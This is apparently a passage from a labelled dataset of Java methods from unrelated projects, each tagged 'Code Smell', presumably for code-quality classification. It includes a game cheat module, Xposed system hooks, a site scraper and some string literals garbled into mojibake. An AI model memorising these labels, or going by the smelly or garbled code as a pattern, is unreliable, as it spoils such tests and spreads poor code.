    float atx=(e.getX() - getContainerViewWidth() / 2) - ((e.getX() - getContainerViewWidth() / 2) - translationX) * (3.0f / scale);
    float aty=(e.getY() - getContainerViewHeight() / 2) - ((e.getY() - getContainerViewHeight() / 2) - translationY) * (3.0f / scale);
    updateMinMax(3.0f);
    if (atx < minX) {
      atx=minX;
    }
 else     if (atx > maxX) {
      atx=maxX;
    }
    if (aty < minY) {
      aty=minY;
    }
 else     if (aty > maxY) {
      aty=maxY;
    }
    animateTo(3.0f,atx,aty,true);
  }
 else {
    animateTo(1.0f,0,0,true);
  }
  doubleTap=true;
  hidePressedDrawables();
  return true;
}",1,Code Smell
"@java.lang.Override public void writeTo(com.google.protobuf.CodedOutputStream output) throws java.io.IOException {
  getSerializedSize();
  if (metadata_ != null) {
    output.writeMessage(1,getMetadata());
  }
  if (!com.google.protobuf.GeneratedMessageV3.isStringEmpty(dummyType_)) {
    com.google.protobuf.GeneratedMessageV3.writeString(output,2,dummyType_);
  }
  if (output_ != null) {
    output.writeMessage(3,getOutput());
  }
  if (seed_ != 0L) {
    output.writeInt64(4,seed_);
  }
  if (getMeansList().size() > 0) {
    output.writeUInt32NoTag(42);
    output.writeUInt32NoTag(meansMemoizedSerializedSize);
  }
  for (int i=0; i < means_.size(); i++) {
    output.writeDoubleNoTag(means_.getDouble(i));
  }
  if (getVariancesList().size() > 0) {
    output.writeUInt32NoTag(50);
    output.writeUInt32NoTag(variancesMemoizedSerializedSize);
  }
  for (int i=0; i < variances_.size(); i++) {
    output.writeDoubleNoTag(variances_.getDouble(i));
  }
  for (int i=0; i < dimensionNames_.size(); i++) {
    com.google.protobuf.GeneratedMessageV3.writeString(output,7,dimensionNames_.getRaw(i));
  }
  unknownFields.writeTo(output);
}",1,Code Smell
"public static ThemeInfo fillThemeValues(File file,String themeName,TLRPC.TL_theme theme){
  try {
    ThemeInfo themeInfo=new ThemeInfo();
    themeInfo.name=themeName;
    themeInfo.info=theme;
    themeInfo.pathToFile=file.getAbsolutePath();
    themeInfo.account=UserConfig.selectedAccount;
    String[] wallpaperLink=new String[1];
    SparseIntArray colors=getThemeFileValues(new File(themeInfo.pathToFile),null,wallpaperLink);
    checkIsDark(colors,themeInfo);
    if (!TextUtils.isEmpty(wallpaperLink[0])) {
      String link=wallpaperLink[0];
      themeInfo.pathToWallpaper=new File(ApplicationLoader.getFilesDirFixed(),Utilities.MD5(link) + "".wp"").getAbsolutePath();
      try {
        Uri data=Uri.parse(link);
        themeInfo.slug=data.getQueryParameter(""slug"");
        String mode=data.getQueryParameter(""mode"");
        if (mode != null) {
          mode=mode.toLowerCase();
          String[] modes=mode.split("" "");
          if (modes != null && modes.length > 0) {
            for (int a=0; a < modes.length; a++) {
              if (""blur"".equals(modes[a])) {
                themeInfo.isBlured=true;
              }
 else               if (""motion"".equals(modes[a])) {
                themeInfo.isMotion=true;
              }
            }
          }
        }
        String intensity=data.getQueryParameter(""intensity"");
        if (!TextUtils.isEmpty(intensity)) {
          try {
            String bgColor=data.getQueryParameter(""bg_color"");
            if (!TextUtils.isEmpty(bgColor)) {
              themeInfo.patternBgColor=Integer.parseInt(bgColor.substring(0,6),16) | 0xff000000;
              if (bgColor.length() >= 13 && AndroidUtilities.isValidWallChar(bgColor.charAt(6))) {
                themeInfo.patternBgGradientColor1=Integer.parseInt(bgColor.substring(7,13),16) | 0xff000000;
              }
              if (bgColor.length() >= 20 && AndroidUtilities.isValidWallChar(bgColor.charAt(13))) {
                themeInfo.patternBgGradientColor2=Integer.parseInt(bgColor.substring(14,20),16) | 0xff000000;
              }
              if (bgColor.length() == 27 && AndroidUtilities.isValidWallChar(bgColor.charAt(20))) {
                themeInfo.patternBgGradientColor3=Integer.parseInt(bgColor.substring(21),16) | 0xff000000;
              }
            }
          }
 catch (          Exception ignore) {
          }
          try {
            String rotation=data.getQueryParameter(""rotation"");
            if (!TextUtils.isEmpty(rotation)) {
              themeInfo.patternBgGradientRotation=Utilities.parseInt(rotation);
            }
          }
 catch (          Exception ignore) {
          }
          if (!TextUtils.isEmpty(intensity)) {
            themeInfo.patternIntensity=Utilities.parseInt(intensity);
          }
          if (themeInfo.patternIntensity == 0) {
            themeInfo.patternIntensity=50;
          }
        }
      }
 catch (      Throwable e) {
        FileLog.e(e);
      }
    }
 else {
      themedWallpaperLink=null;
    }
    return themeInfo;
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
  return null;
}",1,Code Smell
"private Region createBreadcrumbs(Callback<Breadcrumbs.BreadCrumbItem<String>,ButtonBase> crumbFactory,Callback<Breadcrumbs.BreadCrumbItem<String>,? extends Node> dividerFactory){
  var breadcrumbs=new Breadcrumbs<String>();
  breadcrumbs.setMinWidth(0);
  PlatformThread.sync(model.getCurrentPath()).subscribe(val -> {
    if (val == null) {
      breadcrumbs.setSelectedCrumb(null);
      return;
    }
    var sc=model.getFileSystem().getShell();
    if (sc.isEmpty()) {
      breadcrumbs.setDividerFactory(item -> item != null && !item.isLast() ? new Label(""/"") : null);
    }
 else {
      breadcrumbs.setDividerFactory(item -> {
        if (item == null) {
          return null;
        }
        if (item.isFirst() && item.getValue().equals(""/"")) {
          return new Label("""");
        }
        return new Label(sc.get().getOsType().getFileSystemSeparator());
      }
);
    }
    var elements=FileNames.splitHierarchy(val);
    var modifiedElements=new ArrayList<>(elements);
    if (val.startsWith(""/"")) {
      modifiedElements.addFirst(""/"");
    }
    Breadcrumbs.BreadCrumbItem<String> items=Breadcrumbs.buildTreeModel(modifiedElements.toArray(String[]::new));
    breadcrumbs.setSelectedCrumb(items);
  }
);
  if (crumbFactory != null) {
    breadcrumbs.setCrumbFactory(crumbFactory);
  }
  if (dividerFactory != null) {
    breadcrumbs.setDividerFactory(dividerFactory);
  }
  breadcrumbs.selectedCrumbProperty().addListener((obs,old,val) -> {
    model.cdAsync(val != null ? val.getValue() : null);
  }
);
  return breadcrumbs;
}",1,Code Smell
"private static boolean maybeSkipComment(ParsableByteArray input){
  int position=input.getPosition();
  int limit=input.limit();
  byte[] data=input.data;
  if (position + 2 <= limit && data[position++] == '/' && data[position++] == '*') {
    while (position + 1 < limit) {
      char skippedChar=(char)data[position++];
      if (skippedChar == '*') {
        if (((char)data[position]) == '/') {
          position++;
          limit=position;
        }
      }
    }
    input.skipBytes(limit - input.getPosition());
    return true;
  }
  return false;
}",1,Code Smell
"void postChangeRunnable(){
  if (mChangeRunnable == null || !mChangeRunnablePending) {
    return;
  }
  if (mAnimator.isStarted()) {
    if (DEBUG)     Log.v(TAG,""animation in progress"");
  }
 else   if (!mFragmentState.isResumed()) {
    if (DEBUG)     Log.v(TAG,""not resumed"");
  }
 else   if (mLayerDrawable.getAlpha() < FULL_ALPHA) {
    if (DEBUG)     Log.v(TAG,""in transition, alpha "" + mLayerDrawable.getAlpha());
  }
 else {
    long delayMs=getRunnableDelay();
    if (DEBUG)     Log.v(TAG,""posting runnable delayMs "" + delayMs);
    mLastSetTime=System.currentTimeMillis();
    mHandler.postDelayed(mChangeRunnable,delayMs);
    mChangeRunnablePending=false;
  }
}
",1,Code Smell
"@EventHandler(priority=EventPriority.HIGH) private void onPreTick(TickEvent.Pre event){
  didRotateThisTick=false;
  lastRotationTimer++;
  if (placing) {
    if (placingTimer > 0)     placingTimer--;
 else     placing=false;
  }
  if (kaTimer > 0)   kaTimer--;
  if (ticksPassed < 20)   ticksPassed++;
 else {
    ticksPassed=0;
    attacks=0;
  }
  if (bestTargetTimer > 0)   bestTargetTimer--;
  bestTargetDamage=0;
  if (breakTimer > 0)   breakTimer--;
  if (placeTimer > 0)   placeTimer--;
  if (switchTimer > 0)   switchTimer--;
  if (placeRenderTimer > 0)   placeRenderTimer--;
  if (breakRenderTimer > 0)   breakRenderTimer--;
  mainItem=mc.player.getMainHandStack().getItem();
  offItem=mc.player.getOffHandStack().getItem();
  for (IntIterator it=waitingToExplode.keySet().iterator(); it.hasNext(); ) {
    int id=it.nextInt();
    int ticks=waitingToExplode.get(id);
    if (ticks > 3) {
      it.remove();
      removed.remove(id);
    }
 else {
      waitingToExplode.put(id,ticks + 1);
    }
  }
  ((IVec3d)playerEyePos).set(mc.player.getPos().x,mc.player.getPos().y + mc.player.getEyeHeight(mc.player.getPose()),mc.player.getPos().z);
  findTargets();
  if (!targets.isEmpty()) {
    if (!didRotateThisTick)     doBreak();
    if (!didRotateThisTick)     doPlace();
  }
}",1,Code Smell
"private void updateSelectedMessageReactions(){
  if (getDialogId() == getUserConfig().getClientUserId()) {
    ArrayList<MessageObject> messageObjects=new ArrayList<>();
    for (int a=0; a < selectedMessagesIds.length; ++a) {
      for (int k=0; k < selectedMessagesIds[a].size(); ++k) {
        MessageObject messageObject=selectedMessagesIds[a].valueAt(k);
        if (messageObject.hasValidGroupId()) {
          MessageObject.GroupedMessages group=getValidGroupedMessage(messageObject);
          MessageObject.GroupedMessagePosition position=group != null ? group.getPosition(messageObject) : null;
          if (position == null || !position.last) {
            continue;
          }
        }
        messageObjects.add(messageObject);
      }
    }
    boolean hasReactions=false;
    if (tagSelector != null) {
      tagSelector.setSelectedReactionsInclusive(messageObjects);
      hasReactions=!tagSelector.getSelectedReactions().isEmpty();
      tagSelector.setHint(LocaleController.getString(!hasReactions ? R.string.SavedTagReactionsSelectedAddHint : R.string.SavedTagReactionsSelectedEditHint));
      AndroidUtilities.runOnUIThread(() -> {
        if (tagSelector != null) {
          tagSelector.requestLayout();
        }
      }
,120);
    }
 else {
      hasReactions=!ReactionsContainerLayout.getInclusiveReactions(messageObjects).isEmpty();
    }
    ActionBarMenuItem tagItem=actionBar.createActionMode().getItem(tag_message);
    if (tagItem != null) {
      tagItem.setIcon(hasReactions ? R.drawable.menu_tag_edit : R.drawable.menu_tag_plus,true);
    }
  }
  if (selectionReactionsOverlay != null) {
    List<MessageObject> selected=new ArrayList<>();
    SparseArray<MessageObject> objs=selectedMessagesIds[0];
    for (int i=0; i < objs.size(); i++) {
      selected.add(objs.valueAt(i));
    }
    objs=selectedMessagesIds[1];
    for (int i=0; i < objs.size(); i++) {
      selected.add(objs.valueAt(i));
    }
    selectionReactionsOverlay.setSelectedMessages(selected);
  }
}",1,Code Smell
"@NotNull @Override public RelativeVec parse(@NotNull CommandSender sender,@NotNull String input) throws ArgumentSyntaxException {
  final String[] split=input.split(StringUtils.SPACE);
  if (split.length != getNumberCount()) {
    throw new ArgumentSyntaxException(""Invalid number of values"",input,INVALID_NUMBER_COUNT_ERROR);
  }
  double[] coordinates=new double[split.length];
  boolean[] isRelative=new boolean[split.length];
  RelativeVec.CoordinateType type=null;
  for (int i=0; i < split.length; i++) {
    final String element=split[i];
    try {
      final char modifierChar=element.charAt(0);
      if (MODIFIER_CHARS.contains(modifierChar)) {
        isRelative[i]=true;
        if (type == null) {
          type=modifierChar == LOCAL_CHAR ? LOCAL : RELATIVE;
        }
 else         if ((type == LOCAL) != (modifierChar == LOCAL_CHAR)) {
          throw new ArgumentSyntaxException(""Cannot mix world & local coordinates (everything must either use ^ or not)"",input,MIXED_TYPE_ERROR);
        }
        if (element.length() > 1) {
          final String potentialNumber=element.substring(1);
          coordinates[i]=getRelativeNumberParser().apply(potentialNumber).doubleValue();
        }
      }
 else {
        if (type == null) {
          type=ABSOLUTE;
        }
 else         if (type == LOCAL) {
          throw new ArgumentSyntaxException(""Cannot mix world & local coordinates (everything must either use ^ or not)"",input,MIXED_TYPE_ERROR);
        }
        coordinates[i]=getAbsoluteNumberParser().apply(element).doubleValue();
      }
    }
 catch (    NumberFormatException e) {
      throw new ArgumentSyntaxException(""Invalid number"",input,INVALID_NUMBER_ERROR);
    }
  }
  return new RelativeVec(split.length == 3 ? new Vec(coordinates[0],coordinates[1],coordinates[2]) : new Vec(coordinates[0],coordinates[1]),type,isRelative[0],split.length == 3 && isRelative[1],isRelative[split.length == 3 ? 2 : 1]);
}",1,Code Smell
"@Override public Object buildTree(List<DeptDto> deptDtos){
  Set<DeptDto> trees=new LinkedHashSet<>();
  Set<DeptDto> depts=new LinkedHashSet<>();
  List<String> deptNames=deptDtos.stream().map(DeptDto::getName).collect(Collectors.toList());
  boolean isChild;
  for (  DeptDto deptDTO : deptDtos) {
    isChild=false;
    if (deptDTO.getPid() == null) {
      trees.add(deptDTO);
    }
    for (    DeptDto it : deptDtos) {
      if (it.getPid() != null && deptDTO.getId().equals(it.getPid())) {
        isChild=true;
        if (deptDTO.getChildren() == null) {
          deptDTO.setChildren(new ArrayList<>());
        }
        deptDTO.getChildren().add(it);
      }
    }
    if (isChild) {
      depts.add(deptDTO);
    }
 else     if (deptDTO.getPid() != null && !deptNames.contains(findById(deptDTO.getPid()).getName())) {
      depts.add(deptDTO);
    }
  }
  if (CollectionUtil.isEmpty(trees)) {
    trees=depts;
  }
  Map<String,Object> map=new HashMap<>(2);
  map.put(""totalElements"",deptDtos.size());
  map.put(""content"",CollectionUtil.isEmpty(trees) ? deptDtos : trees);
  return map;
}",1,Code Smell
"@Override public void init(){
  if (!isAndroidU()) {
    String pluginLoaderClass=isAndroidT() ? ""com.android.systemui.shared.plugins.PluginInstance$Factory"" : ""com.android.systemui.shared.plugins.PluginManagerImpl"";
    hookAllMethods(pluginLoaderClass,""getClassLoader"",new MethodHook(){
      private boolean isHooked=false;
      @Override protected void after(      MethodHookParam param){
        appInfo=(ApplicationInfo)param.args[0];
        if (appInfo != null) {
          if (""miui.systemui.plugin"".equals(appInfo.packageName) && !isHooked) {
            isHooked=true;
            if (pluginLoader == null) {
              pluginLoader=(ClassLoader)param.getResult();
            }
            setClassLoader(pluginLoader);
          }
 else {
            if (!isHooked)             XposedLogUtils.logD(""appInfo is not miui.systemui.plugin is: "" + appInfo.packageName + "" isHooked: ""+ isHooked);
          }
        }
 else {
          XposedLogUtils.logE(TAG,""appInfo is null"");
        }
      }
    }
);
  }
 else {
    hookAllMethods(""com.android.systemui.shared.plugins.PluginInstance$Factory"",""create"",new MethodHook(){
      @Override protected void before(      MethodHookParam param){
        appInfo=(ApplicationInfo)param.args[1];
      }
    }
);
    findAndHookMethod(""com.android.systemui.shared.plugins.PluginInstance$Factory$$ExternalSyntheticLambda0"",""get"",new MethodHook(){
      private boolean isHooked=false;
      @Override protected void after(      MethodHookParam param){
        Object pathClassLoader=param.getResult();
        if (appInfo != null) {
          if (""miui.systemui.plugin"".equals(appInfo.packageName) && !isHooked) {
            isHooked=true;
            if (pluginLoader == null) {
              pluginLoader=(ClassLoader)pathClassLoader;
            }
            setClassLoader(pluginLoader);
          }
 else {
            if (!isHooked)             XposedLogUtils.logD(""AU appInfo is not miui.systemui.plugin is: "" + appInfo.packageName + "" isHooked: ""+ isHooked);
          }
        }
 else {
          XposedLogUtils.logE(TAG,""AU appInfo is null"");
        }
      }
    }
);
  }
}",1,Code Smell
"/** 
 * Reads the next line. A line ends with  {@code ""\n""} or {@code ""\r\n""}, this end of line marker is not included in the result.
 * @return the next line from the input.
 * @throws IOException for underlying {@code InputStream} errors.
 * @throws EOFException for the end of source stream.
 */
public String readLine() throws IOException {
synchronized (in) {
    if (buf == null) {
      throw new IOException(""LineReader is closed"");
    }
    if (pos >= end) {
      fillBuf();
    }
    for (int i=pos; i != end; ++i) {
      if (buf[i] == LF) {
        int lineEnd=(i != pos && buf[i - 1] == CR) ? i - 1 : i;
        String res=new String(buf,pos,lineEnd - pos,charset.name());
        pos=i + 1;
        return res;
      }
    }
    ByteArrayOutputStream out=new ByteArrayOutputStream(end - pos + 80){
      @Override public String toString(){
        int length=(count > 0 && buf[count - 1] == CR) ? count - 1 : count;
        try {
          return new String(buf,0,length,charset.name());
        }
 catch (        UnsupportedEncodingException e) {
          throw new AssertionError(e);
        }
      }
    }
;
    while (true) {
      out.write(buf,pos,end - pos);
      end=-1;
      fillBuf();
      for (int i=pos; i != end; ++i) {
        if (buf[i] == LF) {
          if (i != pos) {
            out.write(buf,pos,i - pos);
          }
          pos=i + 1;
          return out.toString();
        }
      }
    }
  }
}",1,Code Smell
"@Override public String homeContent(boolean filter){
  try {
    String url=siteUrl + '/';
    Document doc=Jsoup.parse(OkHttpUtil.string(url,getHeaders(url)));
    Elements elements=doc.select(""ul.nav-list > li a"");
    JSONArray classes=new JSONArray();
    ArrayList<String> allClass=new ArrayList<>();
    for (    Element ele : elements) {
      String name=ele.text();
      boolean show=!filter || (name.equals(""鐢靛奖"") || name.equals(""杩炵画鍓�"") || name.equals(""缁艰壓"")|| name.equals(""鍔ㄦ极""));
      if (allClass.contains(name))       show=false;
      if (show) {
        allClass.add(name);
        Matcher mather=regexCategory.matcher(ele.attr(""href""));
        if (!mather.find())         continue;
        String id=mather.group(1).trim();
        JSONObject jsonObject=new JSONObject();
        jsonObject.put(""type_id"",id);
        jsonObject.put(""type_name"",name);
        classes.put(jsonObject);
      }
    }
    JSONObject result=new JSONObject();
    if (filter) {
      result.put(""filters"",filterConfig);
    }
    result.put(""class"",classes);
    try {
      Elements list=doc.select(""div.col-lg-wide-75 > ul.myui-vodlist li div.myui-vodlist__box"");
      JSONArray videos=new JSONArray();
      for (int i=0; i < list.size(); i++) {
        Element vod=list.get(i);
        String title=vod.selectFirst("".title"").text();
        String cover=fixCover(vod.selectFirst("".myui-vodlist__thumb"").attr(""data-original""));
        String remark=vod.selectFirst(""span.pic-text"").text();
        Matcher matcher=regexVid.matcher(vod.selectFirst("".myui-vodlist__thumb"").attr(""href""));
        if (!matcher.find())         continue;
        String id=matcher.group(1);
        JSONObject v=new JSONObject();
        v.put(""vod_id"",id);
        v.put(""vod_name"",title);
        v.put(""vod_pic"",cover);
        v.put(""vod_remarks"",remark);
        videos.put(v);
      }
      result.put(""list"",videos);
    }
 catch (    Exception e) {
      SpiderDebug.log(e);
    }
    return result.toString();
  }
 catch (  Exception e) {
    SpiderDebug.log(e);
  }
  return """";
}",1,Code Smell
"@Override public Task[] readAll(String instance) throws EntranceIllegalParamException, EntranceRPCException, QueryFailedException {
  List<Task> retList=new ArrayList<>();
  if (instance == null || """".equals(instance)) {
    throw new EntranceIllegalParamException(20004,""instance can not be null"");
  }
  RequestReadAllTask requestReadAllTask=new RequestReadAllTask(instance);
  ResponsePersist responsePersist=null;
  try {
  }
 catch (  Exception e) {
    throw new EntranceRPCException(20020,""sender rpc failed "",e);
  }
  if (responsePersist != null) {
    int status=responsePersist.getStatus();
    String message=responsePersist.getMsg();
    if (status != 0) {
      throw new QueryFailedException(20011,""read all tasks failed, reason: "" + message);
    }
    Map<String,Object> data=responsePersist.getData();
    Object object=data.get(TaskConstant.TASK);
    if (object instanceof List) {
      List list=(List)object;
      if (list.size() == 0) {
        logger.info(""no running task in this instance: {}"",instance);
      }
      for (      Object o : list) {
        if (o instanceof RequestPersistTask) {
          retList.add((RequestPersistTask)o);
        }
      }
    }
  }
  return retList.toArray(new Task[0]);
}",1,Code Smell
"@Override public DenseSparseMatrix merge(DenseSparseMatrix[] inputs){
  int sparseLength=inputs[0].getDimension2Size();
  PriorityQueue<MatrixIterator> queue=new PriorityQueue<>();
  int[] totalLengths=new int[inputs[0].getDimension1Size()];
  for (int i=0; i < inputs.length; i++) {
    for (int j=0; j < totalLengths.length; j++) {
      totalLengths[j]+=inputs[i].numActiveElements(j);
    }
    MatrixIterator cur=inputs[i].iterator();
    cur.next();
    queue.add(cur);
  }
  int maxLength=0;
  for (int i=0; i < totalLengths.length; i++) {
    if (totalLengths[i] > maxLength) {
      maxLength=totalLengths[i];
    }
  }
  SparseVector[] output=new SparseVector[totalLengths.length];
  int denseCounter=0;
  int sparseCounter=0;
  int sparseIndex=-1;
  int[] curIndices=new int[maxLength];
  double[] curValues=new double[maxLength];
  while (!queue.isEmpty()) {
    MatrixIterator cur=queue.peek();
    MatrixTuple ref=cur.getReference();
    if (ref.i > denseCounter) {
      int[] indices=Arrays.copyOf(curIndices,sparseCounter + 1);
      double[] values=Arrays.copyOf(curValues,sparseCounter + 1);
      output[denseCounter]=SparseVector.createSparseVector(sparseLength,indices,values);
      Arrays.fill(curIndices,0);
      Arrays.fill(curValues,0);
      sparseIndex=-1;
      sparseCounter=0;
      denseCounter++;
    }
    if (sparseIndex == -1) {
      sparseIndex=ref.j;
      curIndices[sparseCounter]=sparseIndex;
      curValues[sparseCounter]=ref.value;
    }
 else     if (ref.j == sparseIndex) {
      curValues[sparseCounter]+=ref.value;
    }
 else {
      sparseIndex=ref.j;
      sparseCounter++;
      curIndices[sparseCounter]=sparseIndex;
      curValues[sparseCounter]=ref.value;
    }
    if (!cur.hasNext()) {
      queue.poll();
    }
 else {
      cur.next();
      MatrixIterator tmp=queue.poll();
      queue.offer(tmp);
    }
  }
  int[] indices=Arrays.copyOf(curIndices,sparseCounter + 1);
  double[] values=Arrays.copyOf(curValues,sparseCounter + 1);
  output[denseCounter]=SparseVector.createSparseVector(sparseLength,indices,values);
  return DenseSparseMatrix.createFromSparseVectors(output);
}
@Override public SparseVector merge(SparseVector[] inputs){
  int maxLength=0;
  for (int i=0; i < inputs.length; i++) {
    maxLength+=inputs[i].numActiveElements();
  }
  return HeapMerger.merge(Arrays.asList(inputs),inputs[0].size(),new int[maxLength],new double[maxLength]);
}",1,Code Smell
"public void sendGetForImg(MediaServer mediaServerItem,String api,Map<String,Object> params,String targetPath,String fileName){
  String url=String.format(""http://%s:%s/index/api/%s"",mediaServerItem.getIp(),mediaServerItem.getHttpPort(),api);
  HttpUrl parseUrl=HttpUrl.parse(url);
  if (parseUrl == null) {
    return;
  }
  HttpUrl.Builder httpBuilder=parseUrl.newBuilder();
  httpBuilder.addQueryParameter(""secret"",mediaServerItem.getSecret());
  if (params != null) {
    for (    Map.Entry<String,Object> param : params.entrySet()) {
      httpBuilder.addQueryParameter(param.getKey(),param.getValue().toString());
    }
  }
  Request request=new Request.Builder().url(httpBuilder.build()).build();
  logger.info(request.toString());
  try {
    OkHttpClient client=getClient();
    Response response=client.newCall(request).execute();
    if (response.isSuccessful()) {
      if (targetPath != null) {
        File snapFolder=new File(targetPath);
        if (!snapFolder.exists()) {
          if (!snapFolder.mkdirs()) {
            logger.warn(""{}璺緞鍒涘缓澶辫触"",snapFolder.getAbsolutePath());
          }
        }
        File snapFile=new File(targetPath + File.separator + fileName);
        FileOutputStream outStream=new FileOutputStream(snapFile);
        outStream.write(Objects.requireNonNull(response.body()).bytes());
        outStream.flush();
        outStream.close();
      }
 else {
        logger.error(String.format(""[ %s ]璇锋眰澶辫触: %s %s"",url,response.code(),response.message()));
      }
    }
 else {
      logger.error(String.format(""[ %s ]璇锋眰澶辫触: %s %s"",url,response.code(),response.message()));
    }
    Objects.requireNonNull(response.body()).close();
  }
 catch (  ConnectException e) {
    logger.error(String.format(""杩炴帴ZLM澶辫触: %s, %s"",e.getCause().getMessage(),e.getMessage()));
    logger.info(""璇锋鏌edia閰嶇疆骞剁‘璁LM宸插惎鍔..."");
  }
catch (  IOException e) {
    logger.error(String.format(""[ %s ]璇锋眰澶辫触: %s"",url,e.getMessage()));
  }
}
",1,Code Smell
"@Override public int eval0(int x,int z,int center,@NonNull int[] v){
  if (center == ID_MUSHROOM_ISLAND) {
    return v[0] != ID_OCEAN && v[1] != ID_OCEAN && v[2] != ID_OCEAN && v[3] != ID_OCEAN ? center : ID_MUSHROOM_ISLAND_SHORE;
  }
  if (isJungle(center)) {
    if (isJungleCompatible(v[0]) && isJungleCompatible(v[1]) && isJungleCompatible(v[2])&& isJungleCompatible(v[3])) {
      return !isBiomeOceanic(v[0]) && !isBiomeOceanic(v[1]) && !isBiomeOceanic(v[2])&& !isBiomeOceanic(v[3]) ? center : ID_BEACH;
    }
 else {
      return ID_JUNGLE_EDGE;
    }
  }
 else   if (center == ID_EXTREME_HILLS || center == ID_EXTREME_HILLS_WITH_TREES || center == ID_EXTREME_HILLS_EDGE) {
    if (isBiomeOceanic(center)) {
      return center;
    }
 else {
      return !isBiomeOceanic(v[0]) && !isBiomeOceanic(v[1]) && !isBiomeOceanic(v[2])&& !isBiomeOceanic(v[3]) ? center : ID_STONE_BEACH;
    }
  }
 else   if (isSnowyBiome(center)) {
    if (isBiomeOceanic(center)) {
      return center;
    }
 else {
      return !isBiomeOceanic(v[0]) && !isBiomeOceanic(v[1]) && !isBiomeOceanic(v[2])&& !isBiomeOceanic(v[3]) ? center : ID_COLD_BEACH;
    }
  }
 else   if (center == ID_MESA || center == ID_MESA_ROCK) {
    if (!isBiomeOceanic(v[0]) && !isBiomeOceanic(v[1]) && !isBiomeOceanic(v[2])&& !isBiomeOceanic(v[3])) {
      return isMesa(v[0]) && isMesa(v[1]) && isMesa(v[2])&& isMesa(v[3]) ? center : ID_DESERT;
    }
 else {
      return center;
    }
  }
 else   if (center == ID_OCEAN || center == ID_DEEP_OCEAN || center == ID_RIVER || center == ID_SWAMPLAND) {
    return center;
  }
 else {
    return !isBiomeOceanic(v[0]) && !isBiomeOceanic(v[1]) && !isBiomeOceanic(v[2])&& !isBiomeOceanic(v[3]) ? center : ID_BEACH;
  }
}",1,Code Smell
"/** 
 * 根据正在运行的任务节点，迭代获取子级任务节点列表，向后找
 * @param source          起始节点
 * @param runTaskKeyList  正在运行的任务 Key，用于校验任务节点是否是正在运行的节点
 * @param hasSequenceFlow 已经经过的连线的 ID，用于判断线路是否重复
 * @param userTaskList    需要撤回的用户任务列表
 * @return 子级任务节点列表
 */
public static List<UserTask> iteratorFindChildUserTasks(FlowElement source,List<String> runTaskKeyList,Set<String> hasSequenceFlow,List<UserTask> userTaskList){
  hasSequenceFlow=hasSequenceFlow == null ? new HashSet<>() : hasSequenceFlow;
  userTaskList=userTaskList == null ? new ArrayList<>() : userTaskList;
  if (source instanceof StartEvent && source.getSubProcess() != null) {
    userTaskList=iteratorFindChildUserTasks(source.getSubProcess(),runTaskKeyList,hasSequenceFlow,userTaskList);
  }
  List<SequenceFlow> sequenceFlows=getElementOutgoingFlows(source);
  if (sequenceFlows == null) {
    return userTaskList;
  }
  for (  SequenceFlow sequenceFlow : sequenceFlows) {
    if (hasSequenceFlow.contains(sequenceFlow.getId())) {
      continue;
    }
    hasSequenceFlow.add(sequenceFlow.getId());
    if (sequenceFlow.getTargetFlowElement() instanceof UserTask && runTaskKeyList.contains((sequenceFlow.getTargetFlowElement()).getId())) {
      userTaskList.add((UserTask)sequenceFlow.getTargetFlowElement());
      continue;
    }
    if (sequenceFlow.getTargetFlowElement() instanceof SubProcess) {
      List<UserTask> childUserTaskList=iteratorFindChildUserTasks((FlowElement)(((SubProcess)sequenceFlow.getTargetFlowElement()).getFlowElements().toArray()[0]),runTaskKeyList,hasSequenceFlow,null);
      if (CollUtil.isNotEmpty(childUserTaskList)) {
        userTaskList.addAll(childUserTaskList);
        continue;
      }
    }
    userTaskList=iteratorFindChildUserTasks(sequenceFlow.getTargetFlowElement(),runTaskKeyList,hasSequenceFlow,userTaskList);
  }
  return userTaskList;
}",1,Code Smell
"@Override public List<MetricFamilySamples> collect(){
  final List<MetricFamilySamples> mfs=new ArrayList<>();
  if (!started) {
    return mfs;
  }
  Map<String,Long> statsMap=new LinkedHashMap<>();
  StringBuilder strBuff=new StringBuilder(512);
  CounterMetricFamily srvStatusCounter=new CounterMetricFamily(strBuff.append(promConfig.getPromClusterName()).append(""&group=serviceStatus"").toString(),""The service status metrics of TubeMQ-Broker node."",Arrays.asList(""serviceStatus""));
  strBuff.delete(0,strBuff.length());
  BrokerSrvStatsHolder.snapShort(statsMap);
  for (  Map.Entry<String,Long> entry : statsMap.entrySet()) {
    srvStatusCounter.addMetric(Arrays.asList(entry.getKey()),entry.getValue());
  }
  mfs.add(srvStatusCounter);
  CounterMetricFamily webAPICounter=new CounterMetricFamily(strBuff.append(promConfig.getPromClusterName()).append(""&group=webAPI"").toString(),""The web api call metrics of TubeMQ-Broker node."",Arrays.asList(""webAPI""));
  strBuff.delete(0,strBuff.length());
  statsMap.clear();
  WebCallStatsHolder.snapShort(statsMap);
  for (  Map.Entry<String,Long> entry : statsMap.entrySet()) {
    webAPICounter.addMetric(Arrays.asList(entry.getKey()),entry.getValue());
  }
  mfs.add(webAPICounter);
  CounterMetricFamily msgStoreCounter=new CounterMetricFamily(strBuff.append(promConfig.getPromClusterName()).append(""&group=msgStore"").toString(),""The message store metrics of TubeMQ-Broker node."",Arrays.asList(""msgStore""));
  strBuff.delete(0,strBuff.length());
  List<String> labelValues=new ArrayList<>();
  Map<String,ConcurrentHashMap<Integer,MessageStore>> msgTopicStores=tubeBroker.getStoreManager().getMessageStores();
  for (  ConcurrentHashMap<Integer,MessageStore> storeMap : msgTopicStores.values()) {
    if (storeMap == null) {
      continue;
    }
    for (    MessageStore msgStore : storeMap.values()) {
      if (msgStore == null) {
        continue;
      }
      statsMap.clear();
      msgStore.getMsgStoreStatsHolder().snapShort(statsMap);
      for (      Map.Entry<String,Long> entry : statsMap.entrySet()) {
        labelValues.clear();
        labelValues.add(entry.getKey());
        labelValues.add(strBuff.append(""topicName="").append(msgStore.getTopic()).toString());
        strBuff.delete(0,strBuff.length());
        labelValues.add(strBuff.append(""storeId="").append(msgStore.getStoreId()).toString());
        strBuff.delete(0,strBuff.length());
        msgStoreCounter.addMetric(labelValues,entry.getValue());
      }
    }
  }
  mfs.add(msgStoreCounter);
  return mfs;
}",1,Code Smell
"private IncludeGraph(ImmutableMap<AbsolutePackPath,FileNode> nodes,ImmutableMap<AbsolutePackPath,RusticError> failures){
  this.nodes=nodes;
  this.failures=failures;
}
public IncludeGraph(Path root,ImmutableList<AbsolutePackPath> startingPaths){
  Map<AbsolutePackPath,AbsolutePackPath> cameFrom=new HashMap<>();
  Map<AbsolutePackPath,Integer> lineNumberInclude=new HashMap<>();
  Map<AbsolutePackPath,FileNode> nodes=new HashMap<>();
  Map<AbsolutePackPath,RusticError> failures=new HashMap<>();
